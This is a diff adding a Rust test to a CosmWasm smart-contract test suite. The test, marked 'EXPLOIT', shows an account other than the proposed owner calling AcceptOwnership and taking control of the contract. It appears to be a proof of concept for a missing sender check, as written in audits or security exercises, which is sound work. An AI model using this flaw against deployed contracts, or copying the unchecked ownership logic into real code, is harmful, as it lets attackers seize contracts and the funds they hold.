@@ -230,4 +230,57 @@ pub mod tests {
             }
         );
     }
+
+    #[test]
+    fn exploit_ownership_flow() {
+        let (mut app, contract_addr) = proper_instantiate();
+
+        // Initial state
+        let state: State = app
+            .wrap()
+            .query_wasm_smart(contract_addr.clone(), &QueryMsg::State {})
+            .unwrap();
+
+        assert_eq!(
+            state,
+            State {
+                current_owner: Addr::unchecked(ADMIN),
+                proposed_owner: None,
+            }
+        );
+
+        // Ownership transfer
+        app.execute_contract(
+            Addr::unchecked(ADMIN),
+            contract_addr.clone(),
+            &ExecuteMsg::ProposeNewOwner {
+                new_owner: "new_owner".to_string(),
+            },
+            &[],
+        )
+        .unwrap();
+
+        // EXPLOIT: Accept ownership with a different account
+        app.execute_contract(
+            Addr::unchecked("NOT_new_owner"),
+            contract_addr.clone(),
+            &ExecuteMsg::AcceptOwnership {},
+            &[],
+        )
+        .unwrap();
+
+        // Final state
+        let state: State = app
+            .wrap()
+            .query_wasm_smart(contract_addr, &QueryMsg::State {})
+            .unwrap();
+
+        assert_eq!(
+            state,
+            State {
+                current_owner: Addr::unchecked("NOT_new_owner"),
+                proposed_owner: None,
+            }
+        );
+    }
 }
